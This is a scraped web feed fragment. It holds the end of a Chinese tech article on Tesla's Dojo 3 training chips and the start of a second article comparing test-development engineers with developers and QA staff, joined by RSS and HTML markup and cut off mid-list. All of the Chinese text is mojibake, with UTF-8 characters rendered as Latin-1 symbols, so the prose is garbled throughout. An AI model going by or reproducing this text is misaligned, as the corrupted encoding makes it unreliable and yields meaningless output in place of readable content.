<p>è€Œ Dojo3 æ‘’å¼ƒäº†å‰ä¸¤ä»£ Dojo ä¾èµ–è‡ªç ” D1 èŠ¯ç‰‡åŠæ™¶åœ†çº§å°è£…çš„å¤æ‚è·¯å¾„ï¼Œæ ¸å¿ƒåœ¨äºæ¶æ„é‡æ„ä¸æˆæœ¬ä¼˜åŒ–ï¼Œä»ç‰¹æ–¯æ‹‰æˆ˜ç•¥è§„åˆ’æ¥çœ‹ï¼ŒDojo 3 é‡‡ç”¨äº†åŸºäº AI5 å’Œ AI6 èŠ¯ç‰‡çš„ç»Ÿä¸€æ¶æ„ï¼Œä½¿å•é¢—èŠ¯ç‰‡èƒ½å¤ŸåŒæ—¶å¤„ç†è®­ç»ƒå’Œæ¨ç†ä»»åŠ¡ã€‚</p>
<p>è€Œè¿™ç§è®¾è®¡èƒ½å°†ç½‘ç»œå¸ƒçº¿å¤æ‚æ€§ä¸ç¡¬ä»¶æˆæœ¬é™ä½æ•°ä¸ªæ•°é‡çº§ï¼ŒåŒæ—¶ä¿ç•™å¤§è§„æ¨¡å¹¶è¡Œè®¡ç®—èƒ½åŠ›ï¼Œè¿™æˆ–è®¸æ˜¯ç‰¹æ–¯æ‹‰æƒ³è¦æ‘†è„±å¯¹è‹±ä¼Ÿè¾¾ GPU ä¾èµ–ï¼Œè¿½æ±‚è‡ªç ”èŠ¯ç‰‡å‚ç›´æ•´åˆçš„æˆ˜ç•¥ã€‚</p>
<p>ä¸æ­¤åŒæ—¶ï¼ŒDojo 3 æä¾›çš„å¼ºå¤§ä¹Ÿå°†åŠ é€Ÿç‰¹æ–¯æ‹‰ FSD ç«¯åˆ°ç«¯ç¥ç»ç½‘ç»œæ¨¡å‹è¿­ä»£ï¼ŒåŒæ—¶ä¸º Optimus äººå½¢æœºå™¨äººçš„è¿åŠ¨æ§åˆ¶ã€ç¯å¢ƒæ„ŸçŸ¥æ¨¡å‹è®­ç»ƒæä¾›ç®—åŠ›æ”¯æ’‘ã€‚</p>
<p>è¿™å¯¹ç‰¹æ–¯æ‹‰è€Œè¨€ç»å¯¹æ˜¯ä¸€å¤§åˆ©å¥½ï¼Œå¹¶ä¸”ç‰¹æ–¯æ‹‰å°†åˆ©ç”¨ AI5 èŠ¯ç‰‡çš„æ½œèƒ½ï¼Œä¸å†å°†è½¦è½½èŠ¯ç‰‡ä¸å¤§è§„æ¨¡ AI ç®—åŠ›èŠ¯ç‰‡åˆ†å¼€ç ”ç©¶è®¾è®¡ï¼Œè€Œèƒ½å¤Ÿä½¿ç”¨åŒä¸€å¥—èŠ¯ç‰‡è§£å†³å…¨éƒ¨é—®é¢˜ï¼Œä»è®­ç»ƒã€æ¨ç†åˆ°è½¦è¾†å’Œæœºå™¨äººï¼Œç«¯åˆ°ç«¯è‡ªå»ºå®Œæ•´ç®—åŠ›ä½“ç³»ã€‚</p>
<p>è¿™ä¹Ÿè¯´æ˜äº†é©¬æ–¯å…‹ç§°è¿™äº›èŠ¯ç‰‡å°†æˆä¸ºã€Œå…¨çƒå‡ºè´§é‡æœ€é«˜çš„èŠ¯ç‰‡ã€ï¼ŒAI5 æˆ–å°†è¢«è£…è¿›æ•°ç™¾ä¸‡è¾†æ±½è½¦ã€æœºå™¨äººï¼Œå¹¶åŒæ—¶æˆä¸ºæ”¯æ’‘èƒŒåè®­ç»ƒç³»ç»Ÿçš„èŠ¯ç‰‡ã€‚</p>
<p>æ®äº†è§£ï¼Œç›®å‰ç‰¹æ–¯æ‹‰å·²ç»ä¸ä¸‰æ˜Ÿç”µå­ç­¾ç½²äº†ä¸€é¡¹ä»·å€¼ 165 äº¿ç¾å…ƒçš„ AI6 èŠ¯ç‰‡ç”Ÿäº§åè®®ï¼Œè¿™å°†ä¸º Dojo 3 çš„è§„æ¨¡åŒ–æä¾›æœ‰åŠ›æ”¯æ’‘ã€‚</p>
<p>å½“ç„¶äº†ï¼Œé©¬æ–¯å…‹æ¯•ç«Ÿæ˜¯ä¸€ä¸ªç»å¸¸æ»¡å˜´è·‘ç«è½¦çš„äººã€‚</p>
<p>æ›¾ç»é©¬æ–¯å…‹è¡¨ç¤º Dojo3 å°†æ˜¯ã€ŒåŸºäºå¤ªç©ºçš„äººå·¥æ™ºèƒ½è®¡ç®—ã€ï¼Œå› ä¸ºä»–å’Œå…¶ä»–äººè®¤ä¸ºç›¸æ¯”åœ°é¢ä¸Šè¶Šå»ºè¶Šå¤§çš„æ•°æ®ä¸­å¿ƒï¼ŒæŠŠç®—åŠ›æ¬åˆ°è½¨é“ä¸Šï¼Œåè€Œå¯èƒ½æ˜¯æ›´ä¼˜è§£ã€‚å…¶æƒ³æ³•æ˜¯å¤ªç©ºæ›´å®¹æ˜“è·å–å¤ªé˜³èƒ½ï¼Œé‚£é‡Œçš„ä½æ¸©å¯èƒ½ä¼šå¤§å¤§å‡å°‘æ‰€éœ€çš„ç”µåŠ›ç­‰ç­‰ã€‚ä½†ä»–çš„è¯´æ³•å®Œå…¨å±äºæ¨æµ‹ï¼Œç”šè‡³æœ‰ä¸€äº›å¹»æƒ³è‰²å½©ï¼Œä¸“å®¶ä»¬å¯¹æ­¤è¡¨ç¤ºæ€€ç–‘ã€‚</p>
<p>è‡³äºè¿™æ¡è·¯ç©¶ç«Ÿä¼šæŠŠç‰¹æ–¯æ‹‰å¸¦å‘å“ªé‡Œï¼Œèƒ½å¦è¾¾åˆ°é©¬æ–¯å…‹çš„é¢„æœŸï¼ŒDojo 3 æ‰åˆšåˆšèµ°åˆ°èµ·ç‚¹ï¼Œç­”æ¡ˆè¿˜å¾—ç•™ç»™æ—¶é—´ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theverge.com%2Fnews%2F864164%2Fback-to-the-dojo" target="_blank" title="https://www.theverge.com/news/864164/back-to-the-dojo" ref="nofollow noopener noreferrer">www.theverge.com/news/864164â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.engadget.com%2Fai%2Fmusk-claims-tesla-will-restart-work-on-its-dojo-supercomputer-173127863.html" target="_blank" title="https://www.engadget.com/ai/musk-claims-tesla-will-restart-work-on-its-dojo-supercomputer-173127863.html" ref="nofollow noopener noreferrer">www.engadget.com/ai/musk-claâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmubeitech%2Fstatus%2F2013304716931768596" target="_blank" title="https://x.com/mubeitech/status/2013304716931768596" ref="nofollow noopener noreferrer">x.com/mubeitech/sâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Felonmusk%2Fstatus%2F2013034224828215706%3Fs%3D20" target="_blank" title="https://x.com/elonmusk/status/2013034224828215706?s=20" ref="nofollow noopener noreferrer">x.com/elonmusk/stâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‹†è§£èåˆï¼šæµ‹è¯•å¼€å‘ï¼Œä¸€ä¸ªå…³äºâ€œæ›´å¥½â€çš„æ‚–è®º]]></title>    <link>https://juejin.cn/post/7597634458697121798</link>    <guid>https://juejin.cn/post/7597634458697121798</guid>    <pubDate>2026-01-21T11:15:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597634458697121798" data-draft-id="7597596202025451562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‹†è§£èåˆï¼šæµ‹è¯•å¼€å‘ï¼Œä¸€ä¸ªå…³äºâ€œæ›´å¥½â€çš„æ‚–è®º"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:15:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‹†è§£èåˆï¼šæµ‹è¯•å¼€å‘ï¼Œä¸€ä¸ªå…³äºâ€œæ›´å¥½â€çš„æ‚–è®º
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:15:24.000Z" title="Wed Jan 21 2026 11:15:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æŠ€æœ¯èŒåœºä¸­ï¼Œâ€œæµ‹è¯•å¼€å‘â€ï¼ˆTest Development Engineerï¼Œå¸¸ç§°æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆæˆ–SDETï¼‰è¿™ä¸ªå¤´è¡”çš„å‡ºç°ä¸æµè¡Œï¼Œå¸¸å¼•å‘ä¸€ä¸ªæ ¹æœ¬æ€§çš„ç–‘é—®ï¼šå®ƒç©¶ç«Ÿæ˜¯æµ‹è¯•ä¸å¼€å‘å²—ä½çš„ç®€å•å åŠ ï¼Œè¿˜æ˜¯ä¸€ç§æœ¬è´¨çš„è¿›åŒ–ï¼Ÿå®ƒä¸ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„â€œæµ‹è¯•â€ï¼ˆQA/æµ‹è¯•å·¥ç¨‹å¸ˆï¼‰å’Œâ€œå¼€å‘â€ï¼ˆè½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆï¼‰ç›¸æ¯”ï¼Œæ˜¯æ›´å¥½ã€æ›´åï¼Œè¿˜æ˜¯å…¨ç„¶ä¸åŒï¼Ÿè¦ç†æ¸…è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·³å‡ºâ€œæ›´å¥½æˆ–æ›´åâ€çš„äºŒå…ƒè¯„ä»·æ¡†æ¶ï¼Œå»ç†è§£å…¶èƒŒåæ‰€ä»£è¡¨çš„è§’è‰²æ¼”è¿›ã€ä»·å€¼é‡æ„ä¸æŠ€æœ¯å“²å­¦ã€‚</p>
<h3 data-id="heading-0"><strong>ä¸€ã€ æ ¸å¿ƒå®šä½ï¼šä»çº¿æ€§åˆ†å·¥åˆ°ä»·å€¼é—­ç¯</strong></h3>
<p>ä¼ ç»Ÿçš„â€œå¼€å‘â€ä¸â€œæµ‹è¯•â€å²—ä½ï¼Œæ˜¯è½¯ä»¶å·¥ç¨‹ç€‘å¸ƒæ¨¡å‹æˆ–æ—©æœŸæ•æ·æ¨¡å‹ä¸­çº¿æ€§åˆ†å·¥çš„äº§ç‰©ï¼š</p>
<ul>
<li><strong>å¼€å‘ï¼ˆDevï¼‰</strong>ï¼šæ ¸å¿ƒèŒè´£æ˜¯<strong>åˆ›é€ </strong>ã€‚ä»–ä»¬è´Ÿè´£å°†éœ€æ±‚è½¬åŒ–ä¸ºä»£ç ï¼Œæ„å»ºäº§å“çš„åŠŸèƒ½ä¸æ¶æ„ï¼Œé¦–è¦ç›®æ ‡æ˜¯â€œè®©ä¸œè¥¿èƒ½è¿è¡Œèµ·æ¥â€ã€‚</li>
<li><strong>æµ‹è¯•ï¼ˆQAï¼‰</strong>ï¼šæ ¸å¿ƒèŒè´£æ˜¯<strong>éªŒè¯ä¸å®ˆæŠ¤</strong>ã€‚ä»–ä»¬åœ¨å¼€å‘å®Œæˆåä»‹å…¥ï¼Œé€šè¿‡è®¾è®¡ç”¨ä¾‹ã€æ‰§è¡Œæµ‹è¯•æ¥å‘ç°ç¼ºé™·ï¼Œç¡®ä¿äº§å“è´¨é‡ï¼Œé¦–è¦ç›®æ ‡æ˜¯â€œæ‰¾å‡ºå“ªé‡Œä¼šåâ€ã€‚</li>
</ul>
<p>è¿™ç§åˆ†å·¥çš„å¼Šç«¯åœ¨ç°ä»£é«˜é€Ÿè¿­ä»£çš„ç ”å‘æµç¨‹ä¸­æ—¥ç›Šå‡¸æ˜¾ï¼šåé¦ˆå‘¨æœŸé•¿ã€è´¨é‡å·¦ç§»å›°éš¾ã€æµ‹è¯•æ•ˆç‡æˆä¸ºç“¶é¢ˆã€‚</p>
<p><strong>æµ‹è¯•å¼€å‘ï¼ˆSDETï¼‰</strong> çš„å‡ºç°ï¼Œæ­£æ˜¯ä¸ºäº†æ‰“ç ´è¿™å µå¢™ã€‚å…¶æ ¸å¿ƒå®šä½æ˜¯ï¼š<strong>é€šè¿‡å¼€å‘æŠ€èƒ½èµ‹èƒ½ä¸é‡å¡‘æ•´ä¸ªè´¨é‡ä¿éšœä½“ç³»</strong>ã€‚ä»–ä»¬ä¸æ˜¯ç®€å•çš„â€œæ—¢æ‡‚æµ‹è¯•åˆæ‡‚å¼€å‘â€ï¼Œè€Œæ˜¯<strong>ä»¥å¼€å‘è€…çš„æ€ç»´å’Œæ‰‹æ®µï¼Œè§£å†³æµ‹è¯•ã€è´¨é‡å’Œæ•ˆç‡é¢†åŸŸçš„å·¥ç¨‹é—®é¢˜</strong>ã€‚ä»–ä»¬çš„å·¥ä½œä¸æ˜¯å¼€å‘ä¸šåŠ¡åŠŸèƒ½ï¼ˆFeatureï¼‰ï¼Œè€Œæ˜¯å¼€å‘<strong>è´¨é‡åŸºç¡€è®¾æ–½ä¸å·¥å…·</strong>ã€‚</p>
<h3 data-id="heading-1"><strong>äºŒã€ èŒè´£ä¸æŠ€èƒ½ï¼šä»æ‰§è¡Œåˆ°æ„å»º</strong></h3>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªå¯¹æ¯”æ¥å…·ä½“åŒ–ä¸‰è€…çš„åŒºåˆ«ï¼š</p>









































<table><thead><tr><th align="left">ç»´åº¦</th><th align="left"><strong>å¼€å‘ï¼ˆSWEï¼‰</strong></th><th align="left"><strong>æµ‹è¯•ï¼ˆQAï¼‰</strong></th><th align="left"><strong>æµ‹è¯•å¼€å‘ï¼ˆSDETï¼‰</strong></th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒäº§å‡º</strong></td><td align="left">ä¸šåŠ¡åŠŸèƒ½ã€äº§å“ä»£ç </td><td align="left">æµ‹è¯•æŠ¥å‘Šã€ç¼ºé™·åˆ—è¡¨</td><td align="left"><strong>æµ‹è¯•æ¡†æ¶ã€å·¥å…·å¹³å°ã€è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆ</strong></td></tr><tr><td align="left"><strong>ä¸»è¦æ´»åŠ¨</strong></td><td align="left">éœ€æ±‚åˆ†æã€ç³»ç»Ÿè®¾è®¡ã€ç¼–ç ã€è°ƒè¯•</td><td align="left">ç”¨ä¾‹è®¾è®¡ã€æ‰‹åŠ¨/è‡ªåŠ¨åŒ–æµ‹è¯•ã€ç¼ºé™·è·Ÿè¸ª</td><td align="left"><strong>è®¾è®¡å¹¶å®ç°è‡ªåŠ¨åŒ–æµ‹è¯•æ¡†æ¶ã€æ­å»ºCI/CDæµæ°´çº¿ã€è¿›è¡Œæ•ˆèƒ½åˆ†æä¸æ”¹è¿›</strong></td></tr><tr><td align="left"><strong>å…³é”®æŠ€èƒ½</strong></td><td align="left">æ•°æ®ç»“æ„/ç®—æ³•ã€ç³»ç»Ÿè®¾è®¡ã€ç¼–ç¨‹è¯­è¨€ã€ä¸šåŠ¡ç†è§£</td><td align="left">æµ‹è¯•ç†è®ºã€ç”¨ä¾‹è®¾è®¡ã€ç¼ºé™·åˆ†æã€åŸºç¡€è‡ªåŠ¨åŒ–è„šæœ¬</td><td align="left"><strong>æ·±åšçš„ç¼–ç¨‹èƒ½åŠ›ã€æµ‹è¯•ç³»ç»Ÿæ¶æ„è®¾è®¡ã€å¯¹å¼€å‘ä¸è¿ç»´æµç¨‹çš„æ·±åˆ»ç†è§£</strong></td></tr><tr><td align="left"><strong>æ€ç»´æ¨¡å¼</strong></td><td align="left">æ„å»ºæ€ç»´ï¼šå¦‚ä½•å®ç°åŠŸèƒ½ï¼Ÿ</td><td align="left">ç ´å/è´¨ç–‘æ€ç»´ï¼šå“ªé‡Œä¼šå‡ºé—®é¢˜ï¼Ÿ</td><td align="left"><strong>å·¥ç¨‹ä¸æ•ˆç‡æ€ç»´ï¼šå¦‚ä½•ç³»ç»Ÿæ€§ã€è‡ªåŠ¨åŒ–åœ°ä¿éšœè´¨é‡å¹¶æå‡æ•ˆç‡ï¼Ÿ</strong></td></tr><tr><td align="left"><strong>ä»‹å…¥é˜¶æ®µ</strong></td><td align="left">å…¨å‘¨æœŸï¼Œä»¥å‰æœŸä¸ºä¸»</td><td align="left">ä¼ ç»Ÿä¸Šä¸­åæœŸä¸ºä¸»ï¼Œç°ä»£æ•æ·ä¸­æŒç»­å‚ä¸</td><td align="left"><strong>å…¨å‘¨æœŸï¼Œå¹¶è‡´åŠ›äºå°†è´¨é‡æ´»åŠ¨â€œå·¦ç§»â€å’Œâ€œå³ç§»â€ï¼ˆå¦‚ç›‘æ§ï¼‰</strong></td></tr></tbody></table>
<p>ç®€è¨€ä¹‹ï¼Œå¼€å‘å·¥ç¨‹å¸ˆ<strong>å»ºé€ æˆ¿å­</strong>ï¼Œæµ‹è¯•å·¥ç¨‹å¸ˆ<strong>æ£€æŸ¥æˆ¿å­æ˜¯å¦ç‰¢å›º</strong>ï¼Œè€Œæµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆåˆ™<strong>è®¾è®¡å¹¶åˆ¶é€ æ£€æŸ¥æˆ¿å±‹ç”¨çš„æ™ºèƒ½ä»ªå™¨ã€è‡ªåŠ¨åŒ–ç›‘æµ‹ç½‘ç»œï¼Œç”šè‡³æ”¹è¿›å»ºç­‘å·¥è‰ºæœ¬èº«ä»¥å‡å°‘ç¼ºé™·</strong>ã€‚</p>
<h3 data-id="heading-2"><strong>ä¸‰ã€ æ›´å¥½è¿˜æ˜¯æ›´åï¼Ÿä¸€ä¸ªå…³äºä»·å€¼çš„æ‚–è®º</strong></h3>
<p>è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„è¯¯è§£ã€‚å²—ä½ä¹‹é—´ä¸æ˜¯ç®€å•çš„â€œå‡çº§â€æˆ–â€œé™çº§â€å…³ç³»ï¼Œè€Œæ˜¯<strong>ä»·å€¼ç»´åº¦ä¸èŒä¸šè·¯å¾„çš„åˆ†åŒ–</strong>ã€‚</p>
<p><strong>1. å¯¹äºä¸ªäººè€Œè¨€ï¼Œä¸å­˜åœ¨ç»å¯¹çš„é«˜ä¸‹ï¼š</strong></p>
<ul>
<li><strong>â€œæ›´å¥½â€</strong>ï¼šå¦‚æœä½ çƒ­çˆ±ç¼–ç ï¼ŒåŒæ—¶å¯¹ç³»ç»Ÿæ€§çš„è´¨é‡ã€æ•ˆç‡å’Œç”¨æˆ·ä½“éªŒæœ‰å¼ºçƒˆçš„æ‰§ç€ï¼Œäº«å—â€œç”¨æŠ€æœ¯è§£å†³æŠ€æœ¯é—®é¢˜â€çš„ä¹è¶£ï¼Œé‚£ä¹ˆæµ‹è¯•å¼€å‘æä¾›äº†ç‹¬ä¸€æ— äºŒçš„ç»“åˆç‚¹ã€‚å®ƒé€šå¸¸è¦æ±‚æ›´å…¨é¢çš„æŠ€æœ¯æ ˆï¼ˆå‰ç«¯ã€åç«¯ã€è¿ç»´çŸ¥è¯†ï¼‰ï¼ŒèŒä¸šå¤©èŠ±æ¿é«˜ï¼Œå®¹æ˜“å‘æ¶æ„å¸ˆã€æŠ€æœ¯è´Ÿè´£äººæˆ–æ•ˆèƒ½ä¸“å®¶æ–¹å‘è½¬å‹ã€‚</li>
<li><strong>â€œæ›´åâ€</strong>ï¼šå¦‚æœä½ çº¯ç²¹ç—´è¿·äºä¸šåŠ¡é€»è¾‘åˆ›æ–°å’Œæè‡´çš„äº§å“åŠŸèƒ½æ„å»ºï¼Œé‚£ä¹ˆä¸“æ³¨äºå¼€å‘å¯èƒ½æ›´æ»¡è¶³ä½ çš„æˆå°±æ„Ÿã€‚åŒæ ·ï¼Œå¦‚æœä½ å¯¹æ·±åº¦æ¢ç´¢ç”¨æˆ·åœºæ™¯ã€è¿›è¡Œåˆ›é€ æ€§æ¢ç´¢å¼æµ‹è¯•æˆ–ç”¨æˆ·ä½“éªŒåˆ†ææœ‰æµ“åšå…´è¶£ï¼Œèµ„æ·±çš„æ‰‹åŠ¨æµ‹è¯•ä¸“å®¶æˆ–ä¸“é¡¹æµ‹è¯•ä¸“å®¶ï¼ˆå¦‚å®‰å…¨ã€æ€§èƒ½ï¼‰åŒæ ·æ˜¯ä¸å¯æ›¿ä»£çš„é¡¶å°–è§’è‰²ã€‚</li>
</ul>
<p><strong>2. å¯¹äºç»„ç»‡è€Œè¨€ï¼Œæ˜¯èƒ½åŠ›çš„å¿…è¦è¡¥å……ï¼š</strong>
æµ‹è¯•å¼€å‘å²—ä½çš„å…´èµ·ï¼Œåæ˜ äº†è¡Œä¸šä»â€œäººåŠ›å¯†é›†å‹æµ‹è¯•â€å‘â€œæŠ€æœ¯é©±åŠ¨å‹è´¨é‡å·¥ç¨‹â€çš„è½¬å‹ã€‚å®ƒä¸æ˜¯ä¸ºäº†å–ä»£æµ‹è¯•æˆ–å¼€å‘ï¼Œè€Œæ˜¯<strong>å¡«è¡¥äº†å•çº¯ä¸šåŠ¡å¼€å‘ä¸å•çº¯æµ‹è¯•éªŒè¯ä¹‹é—´çš„â€œå·¥ç¨‹æ•ˆèƒ½é¸¿æ²Ÿâ€</strong>ã€‚ä¸€ä¸ªå¥åº·çš„ç ”å‘å›¢é˜Ÿéœ€è¦ä¸‰è€…æœ‰æœºç»“åˆï¼š</p>
<ul>
<li><strong>å¼€å‘</strong> ä¿è¯åŠŸèƒ½è¿­ä»£é€Ÿåº¦ã€‚</li>
<li><strong>æµ‹è¯•</strong> æä¾›æ·±åº¦çš„ä¸šåŠ¡åœºæ™¯éªŒè¯å’Œç”¨æˆ·ä½“éªŒæ´å¯Ÿã€‚</li>
<li><strong>æµ‹è¯•å¼€å‘</strong> ä¿éšœå‰ä¸¤è€…çš„åŸºç¡€æ•ˆç‡ä¸å¯é æ€§ï¼Œè®©å¿«é€Ÿè¿­ä»£ä¸è‡´äºç‰ºç‰²è´¨é‡ã€‚</li>
</ul>
<p>æ²¡æœ‰æµ‹è¯•å¼€å‘ï¼Œå›¢é˜Ÿå¯èƒ½åœ¨å¿«é€Ÿè¿­ä»£ä¸­é™·å…¥è‡ªåŠ¨åŒ–ä¸è¶³ã€é‡å¤åŠ³åŠ¨å’Œè´¨æ•ˆå¤±è¡¡çš„æ³¥æ½­ï¼›è€Œæ²¡æœ‰æ·±è€•ä¸šåŠ¡çš„æµ‹è¯•ä¸“å®¶ï¼Œè‡ªåŠ¨åŒ–å¯èƒ½è¦†ç›–å¹¿æ³›å´åç¦»ç”¨æˆ·çœŸå®åœºæ™¯ã€‚</p>
<h3 data-id="heading-3"><strong>å››ã€ è¶‹åŠ¿ä¸æœªæ¥ï¼šè´¨é‡å·¥ç¨‹ä¸å¼€å‘è€…èµ‹èƒ½</strong></h3>
<p>æœªæ¥çš„è¶‹åŠ¿æ„ˆå‘æ¸…æ™°ï¼š<strong>â€œæµ‹è¯•â€ä½œä¸ºä¸€ç§å­¤ç«‹çš„æ´»åŠ¨æ­£åœ¨æ¶ˆèï¼Œè€Œâ€œè´¨é‡ä¿éšœâ€æ­£ä½œä¸ºä¸€ä¸ªæ ¸å¿ƒç»´åº¦èå…¥æ•´ä¸ªè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸã€‚</strong> æµ‹è¯•å¼€å‘çš„è§’è‰²ä¹Ÿåœ¨éšä¹‹è¿›åŒ–ï¼š</p>
<ol>
